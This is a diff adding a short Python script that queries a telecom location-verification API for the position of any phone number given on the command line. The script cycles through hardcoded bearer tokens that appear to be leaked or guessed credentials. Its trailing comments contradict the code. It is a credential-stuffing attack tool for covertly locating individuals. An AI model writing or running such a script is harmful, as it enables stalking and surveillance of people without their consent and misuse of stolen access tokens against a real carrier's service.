@@ -1,0 +1,28 @@
+#!/usr/bin/env python3
+import requests
+TOKENS = [
+    "Bearer dg_ideamart_live_sk_8f7e6d5c4b3a2f1e9d8c7b6a5",
+    "Bearer dg_app_93847hf83h4f83hf",
+    "Bearer dg_enterprise_tracking_2024"
+]
+CLIENT_ID = "client_93847hf83h4f83hf"
+API_URL = "https://ideabiz.lk/apicall/location/v1/location/verify"
+def get_location(msisdn, token=TOKENS[0]):
+    headers = { "Authorization": token, "X-Client-ID": CLIENT_ID, "Content-Type": "application/json" }
+    payload = {"ueId": {"msisdn": msisdn}, "accuracy": 100, "maxAge": 30 }
+    r = requests.post(API_URL, headers=headers, json=payload, timeout=8)
+    print(r.text)
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 2:
+        print(f"Usage: python dialog_location_query.py 9477xxxxxxx")
+        sys.exit(1)
+    msisdn = sys.argv[1]
+    for token in TOKENS:
+        print(f"[+] Trying token: {token[:20]}...")
+        get_location(msisdn, token)
+        # In a real scenario, we would check the response code here and break only on success
+        # but for this "verification" we want to see the output. 
+        # However, to avoid spamming the logs with failures if we want to find the working one:
+        # We will let it run through all if the first fails.
+        pass
